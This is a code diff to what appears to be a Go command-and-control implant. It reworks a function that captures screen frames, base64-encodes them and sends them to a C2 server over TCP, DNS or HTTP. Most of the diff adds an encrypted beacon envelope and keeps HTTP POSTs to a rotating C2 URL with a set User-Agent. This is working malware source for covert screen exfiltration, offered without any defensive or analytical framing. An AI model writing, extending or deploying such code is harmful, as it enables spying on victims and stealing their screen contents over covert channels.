@@ -6,7 +6,6 @@ package main
 import (
 	"bytes"
 	"encoding/base64"
-	"encoding/json"
 	"fmt"
 	"image/jpeg"
 	"image/png"
@@ -17,44 +16,39 @@ import (
 
 func sendScreenFrame(data []byte) {
 	b64 := base64.StdEncoding.EncodeToString(data)
-	if Protocol == "tcp" || Protocol == "dns" {
-		req := BeaconRequest{
-			UUID: agentUUID,
-			Results: []TaskResult{{
-				Type:   "screen_frame",
-				Output: b64,
-			}},
-		}
-		body, _ := encodeBeacon(req)
-		if Protocol == "tcp" {
-			sendTCPBeacon(body)
-		} else {
-			sendDNSBeacon(body)
-		}
-		return
-	}
-	req := struct {
-		UUID string `json:"uuid"`
-		Data string `json:"data"`
-	}{
+	req := BeaconRequest{
 		UUID: agentUUID,
-		Data: b64,
+		Results: []TaskResult{{
+			Type:   "screen_frame",
+			Output: b64,
+		}},
 	}
-	body, _ := json.Marshal(req)
-	screenURL := C2URLs[currentC2Idx]
-	if !strings.HasPrefix(screenURL, "http://") && !strings.HasPrefix(screenURL, "https://") {
-		screenURL = "http://" + screenURL
-	}
-	httpReq, err := http.NewRequest("POST", screenURL+"/api/v1/screen_frame", bytes.NewReader(body))
-	if err != nil {
+	body, _ := encodeBeacon(req)
+	sendBody, kind, _, ok := buildBeaconEnvelope(body)
+	if !ok || kind != agentFrameEncrypted {
 		return
 	}
-	httpReq.Header.Set("Content-Type", "application/json")
-	httpReq.Header.Set("User-Agent", UserAgent)
-	resp, err := client.Do(httpReq)
-	if err == nil {
-		io.Copy(io.Discard, resp.Body)
-		resp.Body.Close()
+	switch Protocol {
+	case "tcp":
+		sendTCPBeacon(sendBody)
+	case "dns":
+		sendDNSBeacon(sendBody)
+	default:
+		screenURL := C2URLs[currentC2Idx]
+		if !strings.HasPrefix(screenURL, "http://") && !strings.HasPrefix(screenURL, "https://") {
+			screenURL = "http://" + screenURL
+		}
+		httpReq, err := http.NewRequest("POST", screenURL+"/api/v1/screen_frame", bytes.NewReader(sendBody))
+		if err != nil {
+			return
+		}
+		httpReq.Header.Set("Content-Type", "application/json")
+		httpReq.Header.Set("User-Agent", UserAgent)
+		resp, err := client.Do(httpReq)
+		if err == nil {
+			io.Copy(io.Discard, resp.Body)
+			resp.Body.Close()
+		}
 	}
 }
 
